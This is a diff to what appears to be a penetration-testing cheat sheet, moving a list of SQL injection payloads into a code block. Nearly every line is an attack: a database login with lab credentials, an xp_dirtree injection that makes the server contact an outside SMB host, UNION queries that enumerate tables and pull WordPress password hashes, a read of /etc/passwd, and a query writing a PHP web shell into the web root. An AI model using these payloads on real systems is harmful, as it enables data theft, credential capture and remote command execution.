@@ -355,16 +355,18 @@ sqsh -S 10.11.1.31 -U sa -P poiuytrewq
 2> go
 admin');exec+master.dbo.xp_dirtree+'\\192.168.119.152\test,3,2';+--
 ```
+Mine data
+```
+') ORDER BY 2# 
+') union select database(),2# 
+') union select table_name,2 from information_schema.tables where table_schema = "db_name"# 
+') union select column_name,2 from information_schema.columns where table_schema = "db_name" and table_name ="table_name"# 
+') union select column_name,2 from information_schema.columns where table_schema = "db_name" and table_name ="table_name" limit 0,1# 
+') union select column_name,2 from information_schema.columns where table_schema = "db_name" and table_name ="table_name" limit 1,1# 
+') union select column_name,2 from information_schema.columns where table_schema = "db_name" and table_name ="table_name" limit 2,1# 
+') union select user_pass,2 from wp_users# 
+```
 
-1. ') ORDER BY 2# 
-2. ') union select database(),2# 
-3. ') union select table_name,2 from information_schema.tables where table_schema = "db_name"# 
-4. ') union select column_name,2 from information_schema.columns where table_schema = "db_name" and table_name ="table_name"# 
-4. ') union select column_name,2 from information_schema.columns where table_schema = "db_name" and table_name ="table_name" limit 0,1# 
-4. ') union select column_name,2 from information_schema.columns where table_schema = "db_name" and table_name ="table_name" limit 1,1# 
-4. ') union select column_name,2 from information_schema.columns where table_schema = "db_name" and table_name ="table_name" limit 2,1# 
-5. ') union select user_pass,2 from wp_users# 
-	
 ```bash
 select load_file('/etc/passwd');
 select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '/var/www/html/shell.php';
